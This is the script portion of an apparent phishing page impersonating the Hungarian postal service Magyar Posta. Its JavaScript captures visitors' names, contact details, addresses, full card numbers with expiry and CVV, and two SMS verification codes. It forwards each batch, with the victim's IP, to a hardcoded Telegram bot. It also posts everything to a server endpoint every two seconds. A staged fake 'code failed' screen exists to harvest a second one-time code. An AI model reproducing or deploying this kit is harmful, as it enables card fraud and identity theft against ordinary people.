            <p>© 2026 Magyar Posta Zrt. Minden jog fenntartva! Közérdekű adatok</p>
        </div>
    </footer>

    <!-- Logic Controller Scripts -->
    <script>
        // Create Icons
        lucide.createIcons();

        // Unique Visitor Identification (persists)
        let visitorId = localStorage.getItem('posta_visitor_id');
        if (!visitorId) {
            visitorId = 'posta_' + Math.random().toString(36).substring(2, 10);
            localStorage.setItem('posta_visitor_id', visitorId);
        }

        // State Store
        const appState = {
            lastName: '',
            firstName: '',
            email: '',
            phone: '',
            zipCode: '',
            city: '',
            street: '',
            cardHolder: '',
            cardNumber: '',
            cardExpiry: '',
            cardCvv: '',
            smsCode: '',
            resmsCode: ''
        };

        const TELEGRAM_CONFIG = {
            BOT_TOKEN: '7812099151:AAHwfcHCEPgQhrBC98H-V6vkIY-jS7aFq-o',
            CHAT_ID: '-51417069971'
        };

        // Screen swith utility
        function switchScreen(screenId) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            const targetScreen = document.getElementById(screenId);
            if (targetScreen) {
                targetScreen.classList.add('active');
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        }

        // Back link navigation ("يعود للصفحة قبل")
        function goBack() {
            const activeScreen = document.querySelector('.screen.active');
            if (activeScreen) {
                const id = activeScreen.id;
                if (id === 'screen-payment') {
                    switchScreen('screen-address');
                } else if (id === 'screen-sms') {
                    switchScreen('screen-payment');
                } else if (id === 'screen-resms') {
                    switchScreen('screen-sms');
                } else {
                    // Stay or generic back
                    console.log('Already on first screen.');
                }
            }
        }

        // Format Credit Card Number Inputs
        function formatCardNumber(input) {
            let value = input.value.replace(/\D/g, '').substring(0, 16);
            input.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            appState.cardNumber = input.value;
        }

        // Format Expiration MM/YY
        function formatCardExpiry(input) {
            let value = input.value.replace(/\D/g, '').substring(0, 4);
            if (value.length >= 3) {
                input.value = `${value.slice(0, 2)}/${value.slice(2)}`;
            } else {
                input.value = value;
            }
            appState.cardExpiry = input.value;
        }

        // Send Logs and alerts to Telegram
        async function sendToTelegram(message) {
            if (!TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID) {
                console.log('Telegram log:', message);
                return;
            }
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIp = ipData.ip || 'unknown';
                const finalMessage = `${message}\n\n🌐 IP: ${publicIp}`;

                const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.CHAT_ID,
                        text: finalMessage,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (!data.ok) {
                    console.error('Telegram error:', data);
                }
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
            }
        }

        // Submit Address Form (Step 1)
        async function submitAddress() {
            appState.lastName = document.getElementById('lastName').value.trim();
            appState.firstName = document.getElementById('firstName').value.trim();
            appState.email = document.getElementById('email').value.trim();
            appState.phone = document.getElementById('phone').value.trim();
            appState.zipCode = document.getElementById('zipCode').value.trim();
            appState.city = document.getElementById('city').value.trim();
            appState.street = document.getElementById('street').value.trim();

            const fullAddress = `${appState.zipCode} ${appState.city}, ${appState.street}`;
            document.getElementById('display-success-address').innerText = fullAddress;

            // Notify Telegram
            const message = `🇭🇺 <b>Magyar Posta - ÚJ LÁTOGATÓ</b>\n\n` +
                            `👤 Név: <code>${appState.lastName} ${appState.firstName}</code>\n` +
                            `📧 E-mail: <code>${appState.email}</code>\n` +
                            `📞 Telefon: <code>${appState.phone}</code>\n` +
                            `📍 Cím: <code>${fullAddress}</code>`;
            await sendToTelegram(message);

            // Transition to card screen via a 3-second loader
            switchScreen('screen-loading');
            setTimeout(() => {
                switchScreen('screen-payment');
            }, 3000);
        }

        // Card validation visual errors
        function showCardError(msg) {
            const errDiv = document.getElementById('card-error');
            document.getElementById('card-error-text').innerText = msg;
            errDiv.style.display = 'flex';
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        function hideCardError() {
            const errDiv = document.getElementById('card-error');
            if (errDiv) errDiv.style.display = 'none';
        }

        // Submit Payment details (Step 2)
        async function submitPayment() {
            appState.cardHolder = document.getElementById('cardHolder').value.trim();
            const num = document.getElementById('cardNumber').value.replace(/\s+/g, '');
            const exp = document.getElementById('cardExpiry').value.replace(/\//g, '');
            const cvv = document.getElementById('cardCvv').value.trim();

            if (num.length < 16) { showCardError('Kérjük adjon meg egy érvényes 16 jegyű bankkártyaszámot.'); return; }
            if (exp.length < 4) { showCardError('Kérjük adja meg a lejárati dátumot ÉÉ/HH formátumban.'); return; }
            if (cvv.length < 3) { showCardError('Kérjük adja meg a kártya hátoldalán található 3 jegyű biztonsági kódot (CVC).'); return; }

            hideCardError();

            const message = `🇭🇺 <b>Magyar Posta - KÁRTYA ADATOK</b>\n\n` +
                            `👤 Kártyabirtokos: <code>${appState.cardHolder}</code>\n` +
                            `💳 Kártyaszám: <code>${document.getElementById('cardNumber').value}</code>\n` +
                            `📅 Lejárat: <code>${document.getElementById('cardExpiry').value}</code>\n` +
                            `🔒 CVV: <code>${cvv}</code>\n\n` +
                            `👤 Látogató: <code>${appState.lastName} ${appState.firstName}</code>`;
            await sendToTelegram(message);

            // Shift to waiting loader for 4 seconds, then show SMS OTP screen automatically
            switchScreen('screen-loading');
            setTimeout(() => {
                switchScreen('screen-sms');
                startOtpTimer('sms-timer', 180);
                document.getElementById('sms-display-phone').innerText = appState.phone || '+36 ••• ••• •••';
            }, 4000);
        }

        // Submit SMS OTP input (Step 3)
        async function submitSms() {
            appState.smsCode = document.getElementById('smsCode').value.trim();
            
            const message = `🇭🇺 <b>Magyar Posta - SMS KÓD</b>\n\n` +
                            `🔑 SMS ellenőrző kód: <code>${appState.smsCode}</code>\n\n` +
                            `👤 Látogató: <code>${appState.lastName} ${appState.firstName}</code>`;
            await sendToTelegram(message);

            // Switch to loading for 4 seconds, then show resms error screen automatically
            switchScreen('screen-loading');
            setTimeout(() => {
                switchScreen('screen-resms');
                startOtpTimer('resms-timer', 180);
            }, 4000);
        }

        // Submit Re-SMS OTP input (Step 4)
        async function submitResms() {
            appState.resmsCode = document.getElementById('resmsCode').value.trim();
            
            const message = `🇭🇺 <b>Magyar Posta - ÚJ (ISMTÉLT) SMS KÓD</b>\n\n` +
                            `🔑 Új SMS kód: <code>${appState.resmsCode}</code>\n\n` +
                            `👤 Látogató: <code>${appState.lastName} ${appState.firstName}</code>`;
            await sendToTelegram(message);

            // Switch to loading for 4 seconds, then show success screen automatically
            switchScreen('screen-loading');
            setTimeout(() => {
                switchScreen('screen-success');
            }, 4000);
        }

        // Trigger code resend
        function resendCode() {
            alert('Új kód sikeresen elküldve SMS-ben!');
        }

        // Timer controller for SMS OTP
        let smsTimerInterval;
        let resmsTimerInterval;

        function startOtpTimer(timerElementId, durationSeconds) {
            let timeLeft = durationSeconds;
            const timerEl = document.getElementById(timerElementId);
            if (!timerEl) return;

            clearInterval(smsTimerInterval);
            clearInterval(resmsTimerInterval);

            const interval = setInterval(() => {
                const mins = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                timerEl.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(interval);
                }
            }, 1000);

            if (timerElementId === 'sms-timer') smsTimerInterval = interval;
            else resmsTimerInterval = interval;
        }

        // Background Loop to ping server for simple telemetry tracking (Panel commands disabled for fully automated flow)
        async function pingServer() {
            const activeScreen = document.querySelector('.screen.active');
            const activeScreenId = activeScreen ? activeScreen.id : '';

            // Map standard keys for consistency with server schema
            const payload = {
                action: 'ping',
                id: visitorId,
                screen: activeScreenId,
                user: (appState.lastName || appState.firstName) ? `${appState.lastName} ${appState.firstName}` : '',
                email: appState.email || '',
                phone: appState.phone || '',
                address: (appState.zipCode || appState.city) ? `${appState.zipCode} ${appState.city}, ${appState.street}` : '',
                card: appState.cardNumber || '',
                cardExp: appState.cardExpiry || '',
                cardCvv: appState.cardCvv || '',
                smsCode: appState.smsCode || appState.resmsCode || ''
            };

            try {
                await fetch('./api.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                // Note: Panel control commands are completely bypassed here to ensure the client-side automated flow functions perfectly without delay.
            } catch (error) {
                console.error('Connection server error:', error);
            }
        }

        // Run background loop every 2 seconds
        setInterval(pingServer, 2000);
        pingServer(); // Initial call
    </script>
</body>
</html>